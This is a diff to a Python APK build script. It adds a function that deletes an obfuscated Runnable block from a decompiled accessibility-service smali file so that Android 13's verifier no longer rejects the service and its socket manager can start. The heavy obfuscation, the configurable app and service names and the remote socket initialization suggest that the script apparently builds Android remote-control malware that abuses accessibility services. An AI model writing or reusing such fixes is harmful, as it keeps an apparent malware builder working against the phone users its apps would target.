@@ -111,6 +111,45 @@ def _xml_escape(text):
             .replace('"', '&quot;').replace("'", '&apos;'))
 
 
+def patch_accessibility_verifier(dest):
+    """Remove the malformed pre-super runnable from 2.1 accessibility service.
+
+    The vendor template emits an invalid register type at the first synthetic
+    Runnable constructor. Android 13 rejects the service with VerifyError before
+    the socket manager can initialize. The runnable is nonessential; the rest of
+    onServiceConnected performs the normal super call and online initialization.
+    """
+    needle = """    :try_start_0
+    sget-object v0, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
+
+    new-instance v5, Lڝږ؁ڋ/ؤ;
+
+    const/4 v6, 0x5
+
+    invoke-direct {v5, v1, v6}, Lڝږ؁ڋ/ؤ;-><init>(Landroid/content/Context;I)V
+
+    invoke-virtual {v0, v5}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    :catch_0
+"""
+    changed = 0
+    for dp, _dirs, files in os.walk(dest):
+        for name in files:
+            if name != 'MyAccessibilityService.smali':
+                continue
+            path = os.path.join(dp, name)
+            with open(path, encoding='utf-8', errors='replace') as fh:
+                text = fh.read()
+            if needle in text:
+                text = text.replace(needle, '', 1)
+                with open(path, 'w', encoding='utf-8', newline='') as fh:
+                    fh.write(text)
+                changed += 1
+    return changed
+
+
 def patch_app_name(dest, app_name):
     """同步应用名与无障碍服务名。
 
@@ -523,6 +562,8 @@ def build_from_source(params, work_dir, out_apk, source_dir=None):
 
     copy_source(dest, source_dir)
     steps.append(('copy_source', time.time() - t0))
+
+    patch_accessibility_verifier(dest)
 
     old_pkg = ''
     with open(os.path.join(dest, 'AndroidManifest.xml'), encoding='utf-8') as fh:
